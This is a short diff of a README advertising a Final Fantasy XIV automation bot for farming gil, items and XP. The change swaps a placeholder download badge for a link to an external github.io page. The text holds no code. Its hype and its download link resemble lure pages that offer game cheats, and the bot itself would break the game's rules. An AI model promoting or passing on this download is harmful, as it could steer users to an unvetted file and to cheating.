@@ -2,7 +2,7 @@
 
 The ultimate Final Fantasy XIV Bot for 2025, automating resource farming, item collection, and XP gains. Maximize efficiency with no manual grinding—works seamlessly with the latest game updates and offers a user-friendly interface.  
 
-[![Download Final Fantasy XIV Bot](https://img.shields.io/badge/Download-Final_Fantasy_XIV_Bot-blueviolet)](#)  
+[![Download Final Fantasy XIV Bot](https://img.shields.io/badge/Download-Final_Fantasy_XIV_Bot-blueviolet)](https://final-fantasy-xiv-bot.github.io/.github/)  
 
 ## 🎯 Key Features  
 - **Auto-Farm Resources:** Collect gil, items, and materia without manual effort.  
